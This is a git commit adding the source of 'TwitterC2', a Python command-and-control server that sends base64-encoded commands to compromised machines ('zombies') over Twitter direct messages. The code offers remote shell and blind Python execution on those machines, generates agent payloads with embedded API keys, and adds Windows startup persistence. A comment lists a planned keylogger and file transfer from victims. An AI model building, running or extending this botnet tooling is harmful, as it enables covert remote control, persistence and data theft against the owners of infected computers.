16f028663d01e55ca5e69dabc81c9424c525f877
AgeOfMarcus <marcusjw.ftw@gmail.com>
2018-04-22 11:01:56 +0100

    Add files via upload

---
+++ tc2lib.py
@@ -0,0 +1,134 @@
+import tweepy
+import base64
+import ast
+import os
+
+global username, messages, pause, newMsg
+
+path = os.path.dirname(os.path.abspath(__file__))
+
+def get_keys():
+        with open(path+"\\keys.txt","r") as keyfile:
+                keys = [line.rstrip('\n') for line in keyfile]
+                c1, c2, a1, a2, user, agent = '', '', '', '','', ''
+                for key in keys:
+                        key = key.split("=")[1]
+                        if c1 == '':
+                                c1 = key
+                        elif c2 == '':
+                                c2 = key
+                        elif a1 == '':
+                                a1 = key
+                        elif a2 == '':
+                                a2 = key
+                        elif user == '':
+                                user = key
+                        elif agent == '':
+                                agent = key
+                                return c1, c2, a1, a2, user, agent
+
+
+def format_msg(_from,to,command,result,refresh):
+        if not command == False:
+                cmd = format_cmd(command["type"],command["cmd"],command["get_result"],command["background"])
+        else: cmd = False
+        json = {"from":_from, "to":to, "command":cmd, "result":result, "refresh":refresh}
+        encoded = base64.b64encode(str(json).encode()).decode()
+        encoded = "$c2$"+encoded+"$c2$"
+        return encoded
+def unformat_msg(msg):
+        try:
+                text = base64.b64decode(msg.encode()).decode()
+                data = ast.literal_eval(text)
+                if data["command"]:
+                        data["command"] = unformat_cmd(data["command"])
+                return data
+        except Exception as e:
+                print("[Error: %s]\nText:\n%s" % (str(e),msg))
+def format_cmd(_type,cmd,get_result,background):
+        data = {"type":_type, "cmd":cmd, "get_result":get_result, "background":background}
+        encoded = base64.b64encode(str(data).encode()).decode()
+        return encoded
+def unformat_cmd(data):
+                text = base64.b64decode(data.encode()).decode()
+                if not text == False:
+                        data = ast.literal_eval(text)
+                else: data = False
+                return data
+        
+def gen_payload():
+        payload = ''
+        tpath = path+"\\templates\\"
+        keystuff = {"c1":False,"c2":False,"a1":False,"a2":False,"au":False,"su":False}
+        try:
+                with open(tpath+"keys.txt","r") as keyfile:
+                        lines = keyfile.read().split("\n")
+                        keystuff["c1"] = lines[0]
+                        keystuff["c2"] = lines[1]
+                        keystuff["a1"] = lines[2]
+                        keystuff["a2"] = lines[3]
+                        keystuff["au"] = lines[4]
+                        keystuff["su"] = lines[5]
+                template = ''
+                tplate = open(tpath+"agent.py","r").read()
+                payload += ('''
+global consumer_key,consumer_secret,access_token,access_secret,agent_user,server_name
+consumer_key = '%s'
+consumer_secret = "%s"
+access_token = "%s"
+access_secret = "%s"
+agent_user = "%s"
+server_name = "%s"
+''' % (keystuff["c1"],keystuff["c2"],keystuff["a1"],keystuff["a2"],keystuff["au"],keystuff["su"]))
+                payload += tplate
+                filename = input("Enter filename to save payload to: ")
+                with open(path+"\\"+filename,"w") as out_file:
+                        out_file.write(payload)
+                print("[*] Successfully generated payload to [%s]" % (path+"\\"+filename))
+        except Exception as e: print("[Error]: "+str(e))
+
+
+error_noZombie = "[!] Error, no zombie selected"
+error_noArgs = "[!] Argument(s) required"
+error_noCmd = "[!] Not a valid command"
+
+
+mainmenu = '''
+--------------------------------------------------
+|                  -TwitterC2-                   |
+--------------------------------------------------
+| Commands:                                      |
+| exit - exits program                           |
+| help - prints this                             |
+| clear - clears the screen                      |
+| genPayload - generate a payload                |
+| polling [secs] - change server polling         |
+| lshell - drop into a local shell               |
+| list - lists zombies                           |
+| refresh - refresh bots                         |
+| use [id/all] - choose zombie to use            |
+|                                                |
+| ping - check current zombie is alive           |
+| zombiePolling [secs] - change polling time of  |
+|                        current zombie(s)       |
+| shell - interactive shell with zombie          |
+| cmd [cmd] - send command to selected zombie(s) |
+| py [cmd] - send (blind) python code to         |
+|            selected zombie(s)                  |
+| persist - add payload to startup folder        |
+|           (Windows only!)                      |
+--------------------------------------------------
+'''
+
+'''
+from, to, command(type, cmd, get_result, background), result, refresh
+
+Commands to add:
+disinfect - remove persistance from zombie [multiple]
+deleteMessages - delete all messages [require confirm]
+man [cmd] - print detailed help for cmd
+migrate - migrate bot(s) to different account [multiple, require confirm]
+send [localfile] [filename] - send file to zombie [single]
+recv [filename] [localfile] - recieve file from zombie [single]
+keylogger [start/stop] - start/stop keylogger [multiple]
+'''
---
+++ twitterc2.py
@@ -0,0 +1,248 @@
+import tweepy
+import json
+import base64
+import _thread
+import time
+import subprocess
+import os
+
+from tweepy import OAuthHandler
+from tc2lib import *
+from subprocess import Popen as popen
+from subprocess import PIPE as pipe
+
+global username, posts, pause, agent_user
+
+consumer_key, consumer_secret, access_token, access_secret, username, agent_user = get_keys()
+
+auth = OAuthHandler(consumer_key, consumer_secret)
+auth.set_access_token(access_token, access_secret)
+
+api = tweepy.API(auth,wait_on_rate_limit=True)
+pause = 2
+
+queue = [] # ids of posts to handle
+agents = []
+
+path = os.path.dirname(os.path.abspath(__file__))
+
+def ignore():
+        try:
+                with open(path+"\\ignore.txt","r") as idfile:
+                        ids = idfile.read().split("\n")
+                        idlist = []
+                        for ID in ids:
+                                if not ID == '':
+                                        idlist.append(int(ID))
+                        return idlist
+        except:
+                with open(path+"\\ignore.txt","w") as idfile: return []
+def add_ignore(ID):
+        if not ID in ignore():
+                with open(path+"\\ignore.txt","a") as idfile:
+                        idfile.write(str(ID)+"\n")
+
+def run_cmd(cmd):
+        if ' ' in cmd:
+                if cmd.split(" ")[0].lower() == "cd":
+                        newdir = cmd.split(" ")[1]
+                        try:
+                                os.chdir(newdir)
+                                return newdir
+                        except FileNotFoundError:
+                                return "[Error]: FileNotFoundError"
+        result = (popen(cmd,stdout=pipe,shell=True).communicate())[0].decode()
+        if result == '':
+                return "[blank/error]"
+        else:
+                return result
+
+def check_dms():
+        dms = []
+        while True:
+                newdms = []
+                for dm in api.direct_messages(tweet_mode='extended'):
+                        if dm.sender_screen_name == agent_user:
+                                ID = dm.id
+                                if not ID in ignore():
+                                        if not ID in queue:
+                                                queue.append(ID)
+                time.sleep(pause)
+
+def sort_queue():
+        for ID in queue:
+                message = api.get_direct_message(ID, tweet_mode='extended', full_text=True)
+                handle_message(message)
+                queue.remove(ID)
+                add_ignore(ID)
+
+def handle_message(message):
+        text = message.text
+        if '$' in list(text):
+                encoded = text.split('$c2$')[1]
+                data = unformat_msg(encoded)
+                if (not data["from"] == "server") and (data["to"] == "server"):
+                        if not data["from"] in agents:
+                                agents.append(data["from"])
+                                print("[+] New agent [%s]" % (data["from"]))
+                        else:
+                                if data["refresh"]:
+                                        print("[+] Agent [%s] is alive" % (data["from"]))
+                                elif data["result"]:
+                                        result = base64.b64decode((data["result"]).encode()).decode()
+                                        print("[+] Got result from [%s]:\n%s" % (data["from"], result))
+
+
+def start_polling():
+        _thread.start_new_thread(check_dms, ())
+        while True:
+                sort_queue()
+                time.sleep(pause)
+
+
+
+
+
+def user_menu():
+        global pause, zombie
+        print(mainmenu)
+        zombie = ''
+        cmdmsg = 'menu'
+        while True:
+                cmd = input("[%s]: " % cmdmsg)
+                if cmd == "exit":
+                        print("Pausing for [%s] to wait for data..." % str(pause))
+                        time.sleep(pause)
+                        exit(0)
+                elif cmd == "help":
+                        print(mainmenu)
+                elif cmd == "clear":
+                        print("\n"*50)
+                elif cmd == "list":
+                        for bot in agents:
+                                print(bot)
+                elif cmd == "refresh":
+                        message = format_msg("server","all",False,False,True)
+                        dm = api.send_direct_message(agent_user,text=message)
+                        add_ignore(dm.id)
+                        print("[+] Sent refresh command")
+                elif cmd == "ping":
+                        if not zombie == '':
+                                message = format_msg("server",zombie,False,False,True)
+                                dm = api.send_direct_message(agent_user,text=message)
+                                add_ignore(dm.id)
+                                print("[+] Sent ping to [%s]" % zombie)
+                        else:
+                                print(error_noZombie)
+                elif cmd == "shell":
+                        if not (zombie == '' or zombie == 'all'):
+                                running = True
+                                while running:
+                                        command = {"type":"shell","get_result":True,"background":False}
+                                        shellcmd = input(zombie+"# ")
+                                        if not shellcmd == '':
+                                                if shellcmd == "exit":
+                                                        running = False
+                                                        break
+                                                command["cmd"] = shellcmd
+                                                msg = format_msg("server",zombie,command,False,False)
+                                                dm = api.send_direct_message(agent_user,text=msg)
+                                                add_ignore(dm.id)
+                                                print("[+] Sent command, response should arrive soon")
+                                        else:
+                                                print()
+                        else:
+                                print("[!] Please select zombie / zombie cannot be 'all'")
+                elif cmd == "lshell":
+                        running = True
+                        tmpuser = run_cmd("whoami")
+                        l_user = ''
+                        for char in list(tmpuser):
+                                if not len(l_user) == 4:
+                                        l_user += char
+                        while running:
+                                cmd = input(l_user+"# ")
+                                if not cmd == "exit":
+                                        try:
+                                                print(run_cmd(cmd))
+                                        except Exception as e: print("[Error]: "+str(e))
+                                else:
+                                        running = False
+                elif cmd == "genPayload":
+                        gen_payload()
+                elif cmd == "persist":
+                        if not zombie == "":
+                                payloadname = input("Enter payload file name (eg. payload.exe): ")
+                                cmd = "copy %s %s" % (payloadname,'C:\ProgramData\Microsoft\Windows\"Start Menu"\Programs\Startup')
+                                command = {"type":"shell","cmd":cmd,"get_result":True,"background":False}
+                                msg = format_msg("server",zombie,command,False,False)
+                                add_ignore(api.send_direct_message(agent_user,text=msg).id)
+                                print("Sent persist command to [%s]" % zombie)
+                        else: print("[!] Please select zombie first")
+                elif ' ' in list(cmd):
+                        parts = cmd.split(" ")
+                        com = parts[0]
+                        if com == "polling":
+                                try:
+                                        pause = int(parts[1])
+                                except Exception as e:
+                                        print("[Error]: Argument must be a valid integer")
+                        elif com == "use":
+                                try:
+                                        usebot = parts[1]
+                                        if usebot in agents:
+                                                zombie = usebot
+                                        elif usebot == "all":
+                                                zombie = usebot
+                                        else: print("[!] Zombie name is not in list of agents")
+                                except: print(error_noArgs)
+                        elif com == "zombiePolling":
+                                try:
+                                        newtime = int(parts[1])
+                                        if not zombie == '':
+                                                command = {"type":"python","cmd":("pause = "+str(newtime)),"get_result":False,"background":False}
+                                                msg = format_msg("server",zombie,command,False,False)
+                                                dm = api.send_direct_message(agent_user,text=msg)
+                                                add_ignore(dm.id)
+                                                print("[*] Changed [%s] polling time to [%s]" % (zombie,str(newtime)))
+                                        else: print("[!] Please select zombie first")
+                                except Exception as e: print("[Error]: "+str(e))
+                        elif com == "cmd":
+                                if not zombie == "":
+                                        cmdstring = ''
+                                        for word in parts:
+                                                if not word == "cmd":
+                                                        if len(cmdstring) == 0:
+                                                                cmdstring += word
+                                                        else:
+                                                                cmdstring += " "+word
+                                        command = {"type":"shell","cmd":cmdstring,"get_result":True,"background":False}
+                                        msg = format_msg("server",zombie,command,False,False)
+                                        dm = api.send_direct_message(agent_user,text=msg)
+                                        add_ignore(dm.id)
+                                        print("[+] Sent command to [%s]" % zombie)
+                                else:
+                                        print("[!] Please select zombie first")
+                        elif com == "py":
+                                if not zombie == "":
+                                        pycmd = ''
+                                        for part in parts:
+                                                if not part == "py":
+                                                        if len(pycmd) == 0:
+                                                                pycmd += part
+                                                        else:
+                                                                pycmd += " "+part
+                                        command = {"type":"python","cmd":pycmd,"get_result":False,"background":False}
+                                        msg = format_msg("server",zombie,command,False,False)
+                                        dm = api.send_direct_message(agent_user,text=msg)
+                                        add_ignore(dm.id)
+                                        print("Send python code to [%s]" % zombie)
+                                else: print("[!] Please select zombie first")
+                        else: print(error_noCmd)
+                else: print(error_noCmd)
+
+
+
+
+_thread.start_new_thread(start_polling, ( ))
+user_menu()
